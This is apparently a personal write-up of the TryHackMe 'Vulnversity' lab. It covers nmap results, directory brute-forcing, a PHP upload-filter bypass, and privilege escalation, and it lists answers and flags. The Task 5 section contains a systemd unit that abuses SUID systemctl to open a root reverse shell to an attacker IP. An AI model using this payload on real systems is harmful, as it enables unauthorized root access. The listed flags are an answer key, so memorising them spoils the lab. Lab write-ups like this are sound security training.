# Vulnversity | TryHackMe | Vishakhan Pillai | 25/04/2025

```bash
export IP=10.10.18.245
```

## nmap scan

```
# Nmap 7.95 scan initiated Sun May 25 22:26:40 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nmap/initial -vv 10.10.18.245
Nmap scan report for 10.10.232.71
Host is up, received reset ttl 60 (0.26s latency).
Scanned at 2025-05-25 22:26:41 IST for 34s
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 60 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack ttl 60 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 60 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 60 Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Vuln University
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43622/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 21974/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 42371/udp): CLEAN (Failed to receive data)
|   Check 4 (port 25861/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2025-05-25T12:57:06-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-05-25T16:57:06
|_  start_date: N/A
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May 25 22:27:15 2025 -- 1 IP address (1 host up) scanned in 35.65 seconds

```

## Task 1

Deploy the machine
```
no answers needed

```

## Task 2 - Reconnaissance 

1. Scan the box; how many ports are open?
```
6
```

2. What version of the squid proxy is running on the machine?
```
3.5.12
```

3. How many ports will Nmap scan if the flag -p-400 was used?
```
400
```

4. What is the most likely operating system this machine is running?
```
ubuntu
```
5. What port is the web server running on?
```
3333
```

6. What is the flag for enabling verbose mode using Nmap?
```
-v
```

## Task 3 - Locating directories using Gobuster

1. What is the directory that has an upload form page?

gobuster dir -u http://10.10.18.245:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

```
/internal  
```


## Task 4 - Compromise the Webserver

1. What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
```
.php  
```

2. What extension is allowed after running the above exercise?
```
.phtml
```

3. What is the name of the user who manages the webserver?
```
bill
```

4. What is the user flag?
```
8bd7992fbe8a6ad22a63361004cfcedb
```

## Task 5 - Privilege Escalation

1. On the system, search for all SUID files. Which file stands out?
```
/bin/systemctl
```

Abusing /bin/systemctl

```service
[unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.58.216/3333 0>&1'

[Install]
WantedBy=multi-user.target 
```

2. What is the root flag value?

```
a58ff8579f0a9270368d33a9966c7fd5
```